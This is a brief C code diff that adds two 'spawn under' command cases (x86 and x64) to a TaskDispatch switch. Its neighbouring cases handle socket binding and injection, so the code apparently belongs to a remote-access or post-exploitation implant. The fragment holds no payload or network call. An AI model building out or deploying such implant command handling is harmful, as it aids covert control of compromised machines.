@@ -24,6 +24,12 @@ void TaskDispatch(int cmd, char* buffer, int size)
 		case COMMAND_LSOCKET_BIND:
 			ChannelLSocketBind(buffer, size, 0);
 			break;
+		case COMMAND_SPAWNU_X86:
+			SpawnUnder(buffer, size, TRUE);
+			break;
+		case COMMAND_SPAWNU_X64:
+			SpawnUnder(buffer, size, FALSE);
+			break;
 		case COMMAND_INJECT_PING:
 			SpawnAndPing(buffer, size, TRUE);
 			break;
